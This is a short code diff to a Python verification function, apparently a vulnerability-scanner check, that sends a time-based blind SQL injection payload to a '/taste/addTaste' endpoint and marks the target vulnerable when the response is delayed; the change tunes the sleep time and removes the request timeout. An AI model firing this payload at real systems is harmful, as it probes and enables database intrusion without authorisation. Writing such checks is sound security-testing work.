@@ -12,10 +12,10 @@ def verify(url):
         'Accept-Encoding': 'gzip, deflate',
         'Connection':'close'
     }
-    vurl = urllib.parse.urljoin(url, "/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(9-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX")
+    vurl = urllib.parse.urljoin(url, "/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX")
     try:
-        response = requests.get(vurl, headers=headers, timeout= 20)
-        if response.elapsed.total_seconds() > 8:
+        response = requests.get(vurl, headers=headers)
+        if response.status_code not in range(400, 499) and response.elapsed.total_seconds() > 5:
             relsult['vulnerable'] = True
             relsult['verify'] = vurl
         return relsult
